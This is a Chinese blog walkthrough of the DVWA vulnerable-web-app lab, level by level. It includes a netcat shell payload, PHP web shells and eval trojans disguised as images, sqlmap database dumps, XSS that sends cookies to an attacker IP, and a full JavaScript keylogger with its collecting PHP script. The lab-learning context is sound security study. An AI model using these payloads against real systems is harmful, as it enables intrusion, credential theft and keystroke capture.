---
title: DVWA
tags:
  - DVWA
categories:
  - 渗透测试
abbrlink: 57354
date: 2020-04-21 17:23:53
---


###  前言
在大约2017-2018年时间就安装过dvwa，那时候只对安全方面感兴趣，也不知道这玩意是干啥的，所以果断安装好后就被我搁置了。最近这段时间，重新学习安全体系，才知道dvwa是一个非常优秀的靶场。闲话不多说，本章介绍dvwa基本过关锦集，献给我第一个学习靶场dvwa。
<!-- more -->
靶机使用的是Metasploitable2-Linux集成的dvwa环境，不同的dvwa版本，难度选项有些有4个最后一个选项是impossible，我的只有3个，即high=impossible。

### Brute Force
　　爆破表单，主要看你的字典内容是否丰富，首先打开burp，抓包拦截后放进intruder模块。我写过burp使用教程，不懂的移步<a target="_blank" href="https://snowmeteors.github.io/2020/03/29/48647.html">burpsuite使用教程</a>，不多说了。
　　low级别，设置好攻击变量，攻击类型Cluster bomb后，开始设置payloads。
　　<img src="https://s1.ax1x.com/2020/04/21/JGmedH.png">
　　因为知道用户名和密码，为了不浪费时间，我就随便添加几个，如图所示。
　　<img src="https://s1.ax1x.com/2020/04/21/JGnwAH.png">
　　点击attack后，根据length排序找到正确的用户名和密码
　　<img src="https://s1.ax1x.com/2020/04/24/JDDop6.png">
　　medium级别，还是跟上面一模一样的配置，开始攻击后，情况跟low级别的代码一模一样，我一度以为我是不是没有调整级别。
　　high级别下，每次发包会延迟2s，但是只要你有耐心，也能爆破出来不是吗。
### Command Execution
　　执行模块，low级别下。首先可以看到输入一个ip地址，那么先输入一个正确的ip地址127.0.0.1试试
　　<img src="https://s1.ax1x.com/2020/04/21/JGM89s.png">
　　回显正确，试试加入管道符：127.0.0.1 && ls
　　<img src="https://s1.ax1x.com/2020/04/21/JG3lq0.png">
　　命令成功执行，查看源码，创建一个target变量，后面直接执行ping target，无任何消毒机制
　　<img src="https://s1.ax1x.com/2020/04/21/JGGE9g.png">
　　执行;mkfifo /tmp/pipe;sh /tmp/pipe | nc -lvp 4444 > /tmp/pipe后，你会发现最上面的标签栏有个圈圈会不停的转，利用nc连接可以直接得到shell，权限也不是root还要进一步提权。
　　<img src="https://s1.ax1x.com/2020/04/22/JNfJsg.png">
　　medium级别，还是试试127.0.0.1 && ls，执行后发现无任何回显。说明过滤了'&'换一种姿势试了127.0.0.1 ; ls无果。 尝试127.0.0.1 | ls
　　<img src="https://s1.ax1x.com/2020/04/21/JGJePO.png">
　　命令有效，那么在试试127.0.0.1 &&& ls 呢
　　<img src="https://s1.ax1x.com/2020/04/21/JGY9Ff.png">
　　猜测只过滤一次&那么过滤完后的payload就为127.0.0.1 && ls了，127.0. || ls也是可以成功执行的，也就是说没有过滤'|'。直接看源码
　　<img src="https://s1.ax1x.com/2020/04/21/JGtwEq.png">
　　嗯，好吧我承认猜测情况有点差别。它的过滤机制是将'&&'字符变成空字符，将';'同样变成空字符。
　　high级别，我尝试了上述所有payload后无果，好吧直接看源码。看它的消毒机制怎么写的如此完善。
　　<img src="https://s1.ax1x.com/2020/04/21/JGNeiV.png">
　　看不懂没关系，因为我也没有学过php，但学过其他语言的我，基本还是能懂点啥意思，它的过滤机制是只能输入一个ip，如果不是一个正确的ip就出现ERROR: You have entered an invalid IP。所以不存在命令执行，当然你有什么方法能绕过，请一定一定要联系我。我也想知道这到底怎么绕。
### CSRF
　　跨站请求伪造，以下为我对这个csrf的理解
　　有一个站点a，里面有修改密码的功能，此功能中只有一个修改密码框，你只需要输入要修改的密码后，点提交就能成功修改密码了。如修改密码为123
　　然后查看url发现是get方式如 http://<span>www</span>.xxx.com?password_new=123，猜测是否可以直接修改url中的123来修改密码，于是乎试试提交http://<span>www</span>.xxx.com?password_new=456。发现成功将自己的密码修改成了456。
　　那么问题来了，是不是只要在你已经登录了此a站点的情况下，攻击者发给你这个http://<span>www</span>.xxx.com?password_new=xxx，xxx是对方设置的密码，你的密码就会被成功修改？答案是肯定的，这就是一个非常非常简单的csrf。为啥非得要你登陆了此站点下点链接，才会被修改，这个问题不言而喻吧。
　　low级别，在burp中有csrf功能，直接开burp，截取到数据包后点击Generate CSRF PoC
　   <img src="https://s1.ax1x.com/2020/04/21/JGD9kd.png">
　　下面的框中给出了csrf html代码。可以看到我将密码设置成了passwd
　   <img src="https://s1.ax1x.com/2020/04/21/JGssTe.png">
　　选择最下面的Copy HTML。当然你也可以直接点击Test in browser，不知道为啥我这里无效，所以只能手动保存为html文件
　　运行此html后，就是一个非常简单的提交框，点击后密码就会被改变，当然如果在真实的环境下，你要做的尽量真实。比如rtx2080ti大减价，点开链接疯狂抢购啥的。
　　<img src="https://s1.ax1x.com/2020/04/21/JG6aqK.png">
　　点击提交框后，密码修改成功
　　<img src="https://s1.ax1x.com/2020/04/21/JGcI0K.png">
　　查看源码，中间将新的密码通过sql命令更新，可能这里也存在sql注入漏洞，无任何消毒csrf机制，mysql_real_escape_string有消毒sql命令
　　<img src="https://s1.ax1x.com/2020/04/21/JG2QVf.png">
　　medium级别，上述过程全部一样，然后直接点提交按钮后，发现无任何内容，密码修改不成功。嗯我选择放弃，直接查看源码
　　<img src="https://s1.ax1x.com/2020/04/21/JGfjdx.png">
　　多了if判断，referer头是否来自127.0.0.1即本机，嗯这个简单，点击提交功能后，burp拦截下来，添加referer头为127.0.0.1。
　　<img src="https://s1.ax1x.com/2020/04/21/JGhL9S.png">
　　forward后，成功修改密码
　　high级别，你可以看到多了一个输入原密码的框，所以不存在csrf。
### File Inclusion
　　文件包含漏洞，分为本地文件包含和远程文件包含，php里面的我不是太懂，所以我也不会乱说，详细了解移步<a href="https://www.freebuf.com/articles/web/182280.html">freebuf文件包含</a>。
　　本地文件包含直接可以查看到本地文件，造成信息泄露
　　<img src="https://s1.ax1x.com/2020/04/21/JGOq6P.png">
　　可以看到passwd文本中的内容，以下是常见的存储位置
Windows系统
```
c:\boot.ini  // 查看系统版本
c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
c:\windows\repair\sam 	// 存储Windows系统初次安装的密码
c:\ProgramFiles\mysql\my.ini // MySQL配置
c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
c:\windows\php.ini 	// php 配置信息
```

Linux/Unix系统
```
/etc/passwd 	// 账户信息
/etc/shadow 	// 账户密码文件
/usr/local/app/apache2/conf/httpd.conf 	// Apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
/usr/local/app/php5/lib/php.ini // PHP相关配置
/etc/httpd/conf/httpd.conf 	// Apache配置文件
/etc/my.conf // mysql 配置文件
```
　　远程文件包含，首先启动kali中的apach2服务
　　输入service apache2 start，成功开启后没有任何提示，输入cd /var/www/html来到站点目录下。创建一个1.txt文件内容为<?php echo shell_exec($_GET['cmd']);?<span>></span>，这句话意思是执行shell命令
　　访问该站点看是否能正常读取文件内容
　　<img src="https://s1.ax1x.com/2020/04/21/JJSnQs.png">
　　成功执行ls命令，如果在low的级别下远程包含出错移步<a href="https://blog.csdn.net/wang_624/article/details/90381314">解决远程文件包含出错</a>，所以远程文件包含远远不是信息泄露的问题了，已经上升到命令执行了，当然你也可以拿shell了。
　　<img src="https://s1.ax1x.com/2020/04/21/JJ7XQK.png">
　　low级别源码为
```php
<?php 
    $file = $_GET['page']; //The page we wish to display  
?>
```
　　medium级别下，本地文件包含漏洞也无任何过滤，试试远程文件包含，http://<span></span>192.168.2.161/1.txt&cmd=ls，执行后发现无任何反应，产生过滤。可以考虑转换成url编码进行绕过
　　<img src="https://s1.ax1x.com/2020/04/22/JtS5tK.png">
　　执行后，发现url部分'http'被解码了，也被过滤了
　　<img src="https://s1.ax1x.com/2020/04/22/JtSzh8.png">
　　可以尝试双层编码，即刚刚的编码再次编码一次
　　<img src="https://s1.ax1x.com/2020/04/22/JtpDHI.png">
　　双层后url已经非常长了，复制后再次提交，还是无任何反应。猜测可能只对http头部分过滤成空字符，于是再次构造payload为<span>httphttp://<span></span>192.168.2.161/1.txt&cmd=ls</span>，还是无任何反应，改为http://<span>http://<span></span>192.168.2.161/1.txt&cmd=ls</span>，执行后也无任何反应。有点神奇，试试改变http://的位置后变为hthttp<span></span>://tp://192.168.2.161/1.txt&cmd=ls后，命令成功执行说明过滤的很可能是'http://'这一部分。
　　源码为：

```php
<?php 
    $file = $_GET['page']; // The page we wish to display 
    // Bad input validation 
    $file = str_replace("http://", "", $file); 
    $file = str_replace("https://", "", $file);         
?>
```
　　将http:// https:// 过滤掉，查阅str_replace函数，发现此函数是区分大小写的，所以我重新构造url为HTTP://<span></span>192.168.2.161/1.txt&cmd=ls，发现还是不能成功执行，这个是我的疑惑点所在
　　high级别，直接查看源码，因为过不了不浪费时间

```php
<?php   
    $file = $_GET['page']; //The page we wish to display  
    // Only allow include.php 
    if ( $file != "include.php" ) { 
        echo "ERROR: File not found!"; 
        exit; 
    }    
?>
```
　　写的很清楚了，url中只能有include.php，所以不存在文件包含漏洞

### SQL Injection
　　SQL注入，我不会非常详细的写手工注入过程，因为实在是太长，太繁琐了。讲讲我理解的漏洞产生原理。最好你有sql命令基础。将用户提交的值带进sql查询语句，由于没有过滤用户提交的字符，从而导致的sql注入攻击。
　　<b>按照注入点类型来分类</b>
　　数字型注入点、字符型注入点、搜索型注入点
　　<b>按照数据提交的方式来分类</b>
　　GET 注入、POST 注入、Cookie 注入、HTTP 头部注入
　　<b>按照执行效果来分类</b>
　　基于布尔的盲注、基于时间的盲注、基于报错注入、联合查询注入、堆查询注入、宽字节注入
　　这里的环境是报错注入，说的有点含糊直接看源码。
　　low级别
　　<img src="https://s1.ax1x.com/2020/04/22/JNiUNn.png">
　　源码可知，创建了一个id变量，将这个变量带入SELECT first_name, last_name FROM users WHERE user_id = '$id'中，如果我输入1就是user_id = '1'，查询uer_id是1的用户信息
　　<img src="https://s1.ax1x.com/2020/04/22/JNixv8.png">
　　这只是我合法的提交，如果我提交一个'上去，查询语句就变成user_id='''，在sql语句中’号或者"号都是成对出现的如，'',""，这样所以这会使查询语句报错。当然你可能会问万一有用户id是'呢，所以我们还要多次测试验证确实有sql注入语句。
　　第一次提交'
　　<img src="https://s1.ax1x.com/2020/04/22/JNkx0g.png">
　　出现sql查询语句出错，这样有报错信息的叫sql报错注入，而且可以看到我们只提交了'，报错了near '''''，很明显就是引号不配对造成的错误。
　　第二次提交1' and 1=1 # ，完整的查询语句就是SELECT first_name, last_name FROM users WHERE user_id = '1' and 1=1 #'
　　#在sql语句是注释意思，and or 这是基本的逻辑关系，但凡有点数学逻辑基本能懂1=1这种是真，所以整条逻辑就是真
　　<img src="https://s1.ax1x.com/2020/04/22/JNE3Ps.png">
　　id就变成了提交信息去了，很明显存在sql注入攻击。提交改为1' and 1=2 #，提交后无任何回显。因为1=2就是假，又是and整条语句逻辑上就是假，所以就不执行sql语句。
　　剩下的就是什么查表，查数据库，查字段，查属性，获取用户名，主机名等等信息，反正sql命令能做的都能做到。本文章不详细说明人工注入，这里上注入神器sqlmap，还是那句话我也不详细说明sqlmap的具体命令。
　　这里要说明的是sqlmap只能检测一个url是否存在sql注入，而不是给网站的url如www<span></span>.baidu.com。先提交一个1上去后，复制url。
　　<img src="https://s1.ax1x.com/2020/04/22/JNnfC4.png">
　　-u 指定一个可疑存在sql注入的url，因为这个dvwa是需要登录的，所以要加上cookie命令，--dbs是查询有哪些数据库。执行后如图所示查询到的数据库
　　<img src="https://s1.ax1x.com/2020/04/22/JNuDiD.png">
　　查询数据库，表，字段，属性内容如下命令，更多命令请移步<a href="https://www.freebuf.com/sectool/164608.html">超详细SQLMap使用攻略及技巧分享</a>

```
-dbs 查看有哪些数据库
-D 数据库名 --tables 查看当前数据库有哪些表 
-D 数据库名 -T 表名 --columns 查看字段
-D 数据库名 -T 表名 --column --dump 查看当前表内容
```
　　接着继续查询dvwa数据库中有哪些表。
　　输入sqlmap -u "http://<span></span>192.168.2.123/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ef87119a9e058a4616fd5132529eee34;security=low" -D dvwa --tables
　　<img src="https://s1.ax1x.com/2020/04/22/JNK7tO.png">
　　继续查询users表中有哪些字段，输入sqlmap -u "http://<span></span>192.168.2.123/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ef87119a9e058a4616fd5132529eee34;security=low" -D dvwa -T users --columns
　　<img src="https://s1.ax1x.com/2020/04/22/JNMnEV.png">
　　最后只需要查询users表中字段的具体内容就完毕了，输入sqlmap -u "http://<span></span>192.168.2.123/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ef87119a9e058a4616fd5132529eee34;securitwa -T users --columns --dump，因为从结果中大致判断password是md5加密的，所以中间会弹出询问信息，您是否想通过基于字典的攻击来破解它们？我一般直接输入n=no，然后这玩意随便找个md5在线破解。md5是不可逆的，所以这种攻击叫md5撞库解密。
　　<img src="https://s1.ax1x.com/2020/04/22/JNQtMj.png">
　　medium级别，还是直接看代码
　　<img src="https://s1.ax1x.com/2020/04/22/JN6wi8.png">
　　可以看到有一个函数mysql_real_escape_string() ，过滤的字符有\x00、\n、\r、'、"、\x1a
　　这就意味这我们只要输入有'就会被过滤掉，但仔细看sql语句是SELECT first_name, last_name FROM users WHERE user_id = $id，少了两个'$id'，所以还减轻了我们的输入量直接提交1 or 1=2也能成功执行
　　<img src="https://s1.ax1x.com/2020/04/22/JN4S41.png">
　　high级别
　　<img src="https://s1.ax1x.com/2020/04/22/JUpdu4.png">
　　前面直接也是用函数过滤，然后执行if(is_numeric($id))，判断输入是不是数字，好了没有sql注入了散了散了。。
### SQL Injection (Blind)
　　sql布尔盲注，返回是布尔类型即逻辑，比如sql整条语句是真，就返回一种结果。是假可能就是宁一种结果。
　　这次直接提交'上去后，发现无任何回显结果，然而在报错注入中给出了报错信息。这也是布尔盲注的一种特性，然后提交1' and 1=1 #
　　<img src=".ax1x.com/2020/04/22/JNE3Ps.png)
　　整体提交值被">入，后面构造payload就要用ascii()，len()，char()等等函数，太多了这不是本章的重点，直接跳过
### Upload
　　文件上传漏洞，为啥上传个文件都能成漏洞，这个问题提的不错。上传文件功能或多或少一些网站都有，上传照片，文档基本都是个最基本的功能。不过这只是按照常规的方式去思考问题，安全应该大开脑洞，不应该局限自己的思维，试想如果上传一个木马文件上去会怎么样。直接拿到对方服务器权限了啊，所以这就是文件上传漏洞。
　　low级别，直接上传一个php一句话木马试试。1.php里面内容为<<span></span>?php @eval($_POST['hacker']); ?>
　　<img src="https://s1.ax1x.com/2020/04/22/JUERHS.png">
　　看着上面一行英文，请选择一张图片上传，再看看我上传的是php嗯，very good，源码就不看了，因为这部分是我最熟悉的，然而源码却是我最看不懂的部分。。。。
　　medium级别，还是直接像刚刚那样上传php
　　<img src="https://s1.ax1x.com/2020/04/22/JUVIaD.png">
　　文件上传大多数要用抓包工具，还是直接上burp。抓包截断后
　　<img src="https://s1.ax1x.com/2020/04/22/JUmeC4.png">
　　从包头看到了一个MAX_FILE_SIZE还限制了文件大小为100000具体单位暂时不知，重点关注Content-Type，告诉客户端实际返回的内容的内容类型。
　　图中的是Content-Type: application/octet-stream，虽然具体不懂是啥意思，但一看这文件就不是图片，那么是不是可以手动改成图片类型呢，这个问题也问的好，当然可以。这里就介绍mimetype命令。
　　场景设想：如果一个文件原本是1.php，我手动改成1.jpg那么本质上来说它却是php文件，从我们肉眼上来说却是jpg。能骗到人，无法骗到我mimetype(txt以及其衍生文件.json等没有文件头，对这几个文件类型无效)。
　　先看看php类型的
　　<img src="https://s1.ax1x.com/2020/04/22/JUMhpF.png">
　　你说欺骗不了我mimetype，我这就试试将后缀名改为jpg格式
　　<img src="https://s1.ax1x.com/2020/04/22/JUM701.png">
　　此时mimetype笑了，所以利用mimetype命令可以很轻松的查看文件类型，这里查出png格式的类型为image/png。
　　回到burp，如下图更改数据
　　<img src="https://s1.ax1x.com/2020/04/22/JUlwrj.png">
　　发包后出现，上传失败
　　<img src="https://s1.ax1x.com/2020/04/22/JUVIaD.png">
　　这就很尴尬了，是我操作有毛病吗，后来我尝试真正上传一张png图片的时候，确实不行。直到上传了一张jpg才发现可以。果断将格式改为image/jpeg
　　<img src="https://s1.ax1x.com/2020/04/23/JdW0mD.png">
　　成功，还是看看源码吧
　　<img src="https://s1.ax1x.com/2020/04/23/JdW57Q.png">
　　只允许jpg并且要小于100000(我们仍未知道那天所限制的文件大小的单位)
　　high级别，既然使用最高级别了，哪就使用杀手锏了吧。一般这种都会有后缀名判断加Content-Type，还有文件内容判断。
　　先试试改Content-Type和后缀名
　　<img src="https://s1.ax1x.com/2020/04/23/Jd410S.png">
　　发现是能直接上传，然后通过菜刀连接也能成功连上
　　<img src="https://s1.ax1x.com/2020/04/23/Jd4gpR.png">
　　这里必须还要配合文件解析漏洞，所以我们的php即使是jpg格式它还是php马。
　　你以为文件上传就这样结束了吗，当然没有，这次将一句话木马放在一个真正的jpg文件中。
　　<img src="https://s1.ax1x.com/2020/04/23/JdopSs.png">
　　先上传一个真正的jpg文件，然后删除掉图片内容数据只保留前3行即可，插入一句话木马，改后缀名。因为前几行的数据是说明了此文件的类型，mimetype其实就是判断前几行的数据可知此文件的具体类型的。
　　<img src="https://s1.ax1x.com/2020/04/23/JdTIKI.png">
　　放包后成功上传，文件上传这一块知识点远远不止这点。。
　　我遇到一个真实的案例就是不管你上传的是什么后缀名的图片类型，如1.php.jpg 1.php.php.png 啥的反正不管你最后怎么改后缀。最后上传都变成xx.png，这也是防文件上传漏洞的一种方法。

### XSS reflected
　　xss(跨站脚本攻击)，这一块的知识点是JavaScript的利用后面简称js。还是先说说原理，用户在像什么搜索栏，提交栏中输入恶意的js代码，注入进前端代码中，从而触发攻击。
　　low级别，emmm，我知道你懵逼，还是看案例，先输入一个hello后，查看burp的请求历史记录
　　<img src="https://s1.ax1x.com/2020/04/23/Jdq4Ff.png">
　　<img src="https://s1.ax1x.com/2020/04/23/JdqLmn.png">
　　hello原封不动的在这对<<span>pre><</span>/pre>标签中，如果你对js有一定的了解，那么下面一段代码你肯定再熟悉不过了，这次提交框输入<<span>script>alert('xss')<</span>/script>。此语句的意思是弹出一个提醒框，内容为xss，提交后
　　<img src="https://s1.ax1x.com/2020/04/23/JdLhu9.png">
　　还是看刚刚提交的请求历史包
　　<img src="https://s1.ax1x.com/2020/04/23/JdLvDA.png">
　　发现它将这段我们提交的内容，当成html里面的语句来执行了，这就是xss，所以js就让我们在网页弹一个这个玩意吗？no，no这只是js语言的冰山一角而已，别小看js，曾经有个大佬用js写了一个操作系统。
　　言归正传，在这里先试试重定向页面。poc：<<span>script>window.location="https://<span>w</span>ww.baidu.com"<</span>/script>,提交后就会跳转到百度。
　　获取cookie信息演示，先kali侦听80端口，nc -lvp 80，然后提交<<span>script>new Image().src="http://<span></span>攻击者ip地址/c.php?output="+document.cookie;<</span>/script>，如我kali的ip地址是192.168.2.161中间那段攻击者ip地址就是192.168.2.161。提交后。
　　<img src="https://s1.ax1x.com/2020/04/23/Jwp5tA.png">
　　cookie信息一览无遗。
　　最后演示键盘记录器，创建3个文件分别为key.js keylog.txt keylogger.php都放在kali中的/var/www/html
　　<img src="https://s1.ax1x.com/2020/04/23/JwiU3R.png">
　　key.js
```javascript
document.onkeypress = function(evt){
	evt = evt || window.event;
	key = String.fromCharCode(evt.charCode);
	if(key){
		var http = new XMLHttpRequest();
		var param = encodeURI(key);
		http.open("POST","http://192.168.2.161/keylogger.php",true);
		http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		http.send("key="+param);
	}
}

```
　　keylogger.php
```php
<?php
$key = $_POST['key'];
$logfile="keylog.txt";
$fp = fopen($logfile,"a");
fwrite($fp,$key);
fclose($fp);
?>

```
　　keylog.txt是用来存储击键内容，然后开启kali的apach服务service apache2 start，先试试访问key.js能成功不
　　<img src="https://s1.ax1x.com/2020/04/23/JwP711.png">
　　成功访问后，输入框提交<<span>script src="http://攻击者ip/key.js"></script</span>>
　　<img src="https://s1.ax1x.com/2020/04/23/JwF1xI.png">
　　除了输出一段hello外似乎无任何变化，但是只要你在这个页面上击键比如，随便输入qwer，在查看keylog内容后发现已经被记录，还是那句话这只是js功能的冰山一角。
　　<img src="https://s1.ax1x.com/2020/04/23/JwkpOP.png">
　　源码也是没啥过滤。补充一下这是反射性xss，刚才演示中可以看到要自己去点击提交后才能触发这些恶意行为，所以反射性xss一般都配合社会工程学，诱导对方去点击存在xss的网页链接，并且如果是要登陆的网页，对方还需要先登陆才行，和上面的csrf过程很像。一旦对方关闭了此网页后，攻击代码立刻失效。
　　<img src="https://s1.ax1x.com/2020/04/23/Jwkmyq.png">
　　medium级别，先试试大写绕过，poc：<<span>Script>alert('xss')</script</span>>，成功弹窗。双写绕过，poc：<scr<<span>script>ipt>alert('xss')</script</span>>，其他html标签只要能加载js就行，poc：<img src="#" onerror=alert("xss")><<span>/img</span>>。还有非常多的姿势
　　源码：只是将<<span>script</span>>过滤掉
　　<img src="https://s1.ax1x.com/2020/04/24/JDQIr8.png">
　　high级别，下无论你输入什么都会原封不动的返回出来。<<span>script></script</span>>它会吧它处理成正常的文本，而不是html标签语法。
　　<img src="https://s1.ax1x.com/2020/04/24/JD3rrV.png">
　　源码
　　<img src="https://s1.ax1x.com/2020/04/24/JD1aX6.png">
　　htmlspecialchars函数把预定义的字符转换为 HTML 实体。
　　& （和号）成为 &
　　" （双引号）成为 "
　　' （单引号）成为 '
　　< （小于）成为 <
　　> （大于）成为 >
　　在这里不存在xss的情况，仅仅在这里而已，看插入代码的具体位置，这里输入的内容是一对括号之内的。
　　<img src="https://s1.ax1x.com/2020/04/24/JD8CdS.png">
　　而这个函数不会过滤'单引号，如果代码插入的位置是在如<<span>a href='你提交的内容'></a</span>>，那么构造poc为' onlick='alert(xss)，代入进语句就是<<span>a href='' onlick='alert(xss)'></a</span>>，这样也能成功执行xss，所以不能一概而论，要看具体的情况而定。
### XSS stored
　　存储型xss，这个意思是将xss注入进服务器中，反射性xss还要诱导对方来点击。而这个存储型xss你只需要睡一觉，等明天看有多少鱼儿上钩就完事。最经常见的例子就是留言板，你提交留言后，每个人都可以看见这条留言。所以你注入恶意js代码后，每个人只要点击查看留言那么它就中招了。
　　先正常提交一些数据。
　　<img src="https://s1.ax1x.com/2020/04/24/JDaoUP.png">
　　测试发现在Name，和message框输入到一定长度的时候就无法输入了。
　　<img src="https://s1.ax1x.com/2020/04/24/JDUGSe.png">
　　这个时候f12定位到输入框位置，看见一个maxlength="50"，这个就是限制输入的长度，删除掉即可解除长度限制。
　　<img src="https://s1.ax1x.com/2020/04/24/JDUHX9.png">
　　之后的攻击步骤都是跟上面的反射性xss都是一样的，提交后，先弹窗xss
　　<img src="https://s1.ax1x.com/2020/04/24/JDaEAP.png">
　　然后f5刷新页面，发现又会弹窗xss
　　<img src="https://s1.ax1x.com/2020/04/24/JDavbn.png">
　　点击左边的Setup，然后点击Create/Reset Database可以重置数据库信息，这样就会把我们前面注入的xss信息重置掉。
　　<img src="https://s1.ax1x.com/2020/04/24/JDdoL9.png">
　　如果换成窃取cookie信息，管理员一点开查看留言板，他的cookie就会被泄露。其他等级就不试了，无非就是绕过姿势。然后如果你又不懂js，而为了学xss又去专门花几个月时间系统学习了一下前端，感觉有点得不偿失。这时候BeEF登场了，它是一款专门配合xss漏洞的攻击框架，就看看界面，详细了解的话本篇不介绍。
　　<img src="https://s1.ax1x.com/2020/04/24/JD0EA1.png">
　　还有一个忘了说了，xss分三种类型，反射性xss，存储型xss前面都说过，剩下一个是dom型xss。还是前端有关的，dom对象，不了解，不多讲。
### 总结
　　对sql命令有多熟悉，就对sql注入有多了解，攻击面有多广。对js有多了解，就对xss攻击程度有多深。
　　互联网本来是安全的，自从有了研究安全的人之后，互联网就变得不安全了！

<div style="text-align: right;">————《白帽子讲Web安全》</div>